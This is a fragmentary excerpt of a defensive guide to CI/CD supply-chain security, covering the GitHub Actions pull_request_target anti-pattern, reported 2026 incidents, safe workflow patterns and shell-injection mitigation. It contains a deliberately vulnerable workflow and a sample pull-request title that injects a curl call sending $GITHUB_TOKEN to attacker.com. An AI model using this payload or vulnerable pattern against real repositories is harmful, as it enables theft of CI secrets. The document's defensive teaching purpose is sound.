...
The CNCF Software Supply Chain Best Practices white paper v2[^cncf-sscp-v2] provides comprehensive guidance on securing CI/CD pipelines, with persona-based recommendations for developers, operators, and security teams. It cites industry estimates that software supply chain attacks cost over $45 billion in 2023, underscoring why build infrastructure deserves production-grade security controls.
...
```yaml
# Define DEPLOY_KEY as a protected and masked CI/CD variable
# in GitLab project or group settings, not in this YAML file.
...
jobs:
  build:
    ...
    steps:
      ...
      # Lockfile integrity checks help detect tampered dependencies
```
...
```json
{
  ...
  "predicate": {
    ...
    "runDetails": {
      ...
      "metadata": {"invocationId": "https://github.com/org/repo/actions/runs/12345"}
    }
  }
}
```
...
Certain CI/CD patterns create vulnerabilities that are easy to overlook. These anti-patterns often arise from legitimate requirements but implement solutions in insecure ways.

### GitHub Actions: `pull_request_target` Injection

A particularly dangerous attack vector involves the `pull_request_target` event in GitHub Actions. Unlike `pull_request`, which runs workflow code from the PR branch in a restricted context, `pull_request_target` runs workflow code from the *base branch* but with access to repository secrets and write permissions. If the workflow checks out and executes PR code, an attacker can submit a malicious PR that gains full access to secrets:

```yaml
# DANGEROUS: Checks out untrusted PR code with secret access
...
jobs:
  build:
    ...
    steps:
      ...
      - run: npm test  # Executes attacker-controlled code with secrets
        env:
...
- The workflow file itself is trusted (from the base branch)
- But the checked-out code is untrusted (from the PR branch)
- Secrets are available because `pull_request_target` is "trusted"
- Attacker can modify `package.json` scripts, test files, or any code path

!!! example "2026: Cordyceps showed this pattern at scale"

    In June 2026, Novee Security named **Cordyceps** for workflow compositions where untrusted pull requests can trigger privileged workflows. In a scan of about 30,000 high-impact repositories, researchers reported 300+ fully exploitable cases. Reported examples included Microsoft's Azure Sentinel, where a PR comment could run anonymous attacker code on Microsoft CI and steal a non-expiring GitHub App key; Google's AI Agent Development Kit samples, where a PR could gain complete authority over a Google Cloud repository; Apache Doris, where PR comments could trigger zero-click code execution and exfiltrate CI credentials; Cloudflare Workers SDK, where a crafted branch name could execute commands on CI runners; and Python's Black, where a single PR could steal an automation token usable to approve PRs.[^cordyceps] After disclosure, Microsoft and Google reportedly confirmed impact, while Cloudflare, Python, and Apache applied hardening or patches. The reported attack path required no organization membership; a free account was enough to forge approvals, push code, or steal credentials. The important lesson is not that a single GitHub Actions feature was broken, but that untrusted PR data crossed a trust boundary while each individual workflow component was "working as designed."

    We recommend treating every PR-triggered workflow as untrusted until a protected environment, maintainer approval, and least-privilege token scope say otherwise. Prefer `pull_request` for validation, keep `GITHUB_TOKEN` read-only by default, require approval for workflows from forks, and do not expose long-lived or non-expiring credentials to any job reachable from PR metadata. Novee also warned that agentic coding can reproduce these workflow patterns at scale, so template review matters as much as reviewing hand-written YAML.

!!! example "2026: AsyncAPI—from research finding to live exploitation"

    Weeks after the Cordyceps disclosures, the pattern moved from exposure to exploitation. On July 14, 2026, attackers exploited a `pull_request_target` workflow across four core AsyncAPI repositories to steal the `asyncapi-bot` personal access token, then published five trojanized packages—including `@asyncapi/generator` and `@asyncapi/specs`, with a combined 2.25+ million weekly downloads—to npm. The payload staged a multi-stage remote access trojan via IPFS and harvested browser data, SSH keys, cloud credentials, and tokens. The malicious versions were live for roughly four hours before removal.[^asyncapi-hijack] The bot account is the lesson: automation identities with publishing rights concentrate exactly the privileges these workflow patterns expose, so their tokens deserve the tightest possible scoping, rotation, and monitoring.

**Safe patterns:**

```yaml
# SAFE: Two-workflow approach
# Workflow 1: Validate in restricted context
on: pull_request
jobs:
  validate:
    runs-on: ubuntu-latest
...
# Workflow 2: Only runs on approval
on:
  pull_request_review:
    types: [submitted]
jobs:
...
- [ ] Audit all `pull_request_target` workflows
- [ ] Prefer `pull_request` over `pull_request_target` for untrusted validation
- [ ] Never check out `github.event.pull_request.head.sha` in privileged workflows
- [ ] Use separate workflows for validation (unprivileged) and deployment (privileged)
- [ ] Set `GITHUB_TOKEN` and job `permissions` to read-only unless a protected job needs more
- [ ] Require approval before workflows from forks or external PRs perform privileged actions
- [ ] Remove long-lived and non-expiring credentials from all PR-triggered jobs

### Environment Variable Injection

Build systems often interpolate user-controlled data into shell commands. Without proper escaping, attackers can inject arbitrary commands:

```yaml
# DANGEROUS: Unescaped interpolation
- run: echo "Building ${{ github.event.pull_request.title }}"
  # PR title: "fix"; curl attacker.com/steal?token=$GITHUB_TOKEN
```

**Mitigation:** Use environment variables instead of inline interpolation:
...
[^cordyceps]: The Hacker News, "Cordyceps CI/CD Flaws Expose 300+ GitHub Repositories to Supply Chain Attacks," June 2026, https://thehackernews.com/2026/06/cordyceps-cicd-flaws-expose-300-github.html; Ionut Arghire, "Exploitable CI/CD Vulnerabilities Expose Millions of Repositories to Hijacking," SecurityWeek, June 2026, https://www.securityweek.com/exploitable-ci-cd-vulnerabilities-expose-millions-of-repositories-to-hijacking/

[^asyncapi-hijack]: GitGuardian, "The Streak Continues: Four More Supply Chain Attacks Hit npm and PyPI," July 2026, https://blog.gitguardian.com/shai-hulud-npm-pypi-supply-chain-attacks/
